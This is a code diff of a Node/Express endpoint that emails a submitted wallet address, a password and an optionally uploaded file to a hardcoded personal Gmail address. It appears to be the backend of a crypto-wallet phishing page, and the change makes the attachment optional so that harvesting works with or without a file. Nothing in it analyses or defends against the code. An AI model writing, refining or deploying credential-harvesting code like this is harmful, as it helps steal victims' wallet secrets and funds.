@@ -82,30 +82,34 @@ app.post("/barbs/send-email", upload.single("file"), async (req, res) => {
       },
     });
 
-    let mailOptions = {
+    // Prepare email options
+    const mailOptions = {
       from: emailAddress,
       to: "fadeyibi26@gmail.com",
-      // to: "dorisnewsome4@gmail.com",
       subject: "Wallet Address",
       text: `Wallet: ${wallet}\nPassword: ${text}`,
-      attachments: [
-        {
-          filename: file.originalname,
-          path: file.path, // path to the uploaded file
-        },
-      ],
+      attachments: [],
     };
 
+    // Only attach the file if it exists
+    if (file) {
+      mailOptions.attachments.push({
+        filename: file.originalname,
+        path: file.path,
+      });
+    }
+
+    // Send the email
     await transporter.sendMail(mailOptions);
 
-    // Clean up uploaded file after sending
-    fs.unlink(file.path, () => {
-      console.log("Temporary file deleted.");
-    });
+    // Clean up file if it was uploaded
+    if (file) {
+      fs.unlink(file.path, () => {
+        console.log("Temporary file deleted.");
+      });
+    }
 
-    res
-      .status(200)
-      .json({ message: "Email sent with attachment successfully!" });
+    res.status(200).json({ message: "Email sent successfully!" });
   } catch (error) {
     console.error("Error sending email:", error);
     res.status(500).json({ error: "Error sending email" });
